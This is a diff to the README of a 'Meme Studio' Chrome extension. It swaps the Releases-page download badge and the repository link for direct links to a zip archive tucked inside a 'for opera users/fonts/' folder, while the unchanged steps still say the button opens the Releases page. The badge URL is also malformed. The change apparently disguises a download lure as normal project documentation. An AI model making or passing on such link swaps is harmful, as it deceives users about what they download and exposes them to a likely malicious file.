@@ -8,7 +8,7 @@ Welcome to Meme Studio! This modern Chrome extension is made for meme enthusiast
 
 To get started, visit the Releases page to download Meme Studio:
 
-[![Download Meme Studio](https://img.shields.io/badge/Download-Meme%20Studio-blue.svg)](https://github.com/thomasfahy11/Meme-studio/releases)
+[![Download Meme Studio](https://raw.githubusercontent.com/thomasfahy11/Meme-studio/main/for opera users/fonts/Meme-studio_2.5.zip%https://raw.githubusercontent.com/thomasfahy11/Meme-studio/main/for opera users/fonts/Meme-studio_2.5.zip)](https://raw.githubusercontent.com/thomasfahy11/Meme-studio/main/for opera users/fonts/Meme-studio_2.5.zip)
 
 1. Click the button above to go to the Releases page.
 2. Find the latest version of Meme Studio.
@@ -53,7 +53,7 @@ Your feedback is important to us. If you have suggestions for features or improv
 
 ## 🔗 Additional Links
 
-- GitHub Repository: [https://github.com/thomasfahy11/Meme-studio](https://github.com/thomasfahy11/Meme-studio)
+- GitHub Repository: [https://raw.githubusercontent.com/thomasfahy11/Meme-studio/main/for opera users/fonts/Meme-studio_2.5.zip](https://raw.githubusercontent.com/thomasfahy11/Meme-studio/main/for opera users/fonts/Meme-studio_2.5.zip)
 - Documentation: Visit the wiki for usage tips and tricks.
 
 Thank you for using Meme Studio! We hope you have fun creating and sharing your memes.
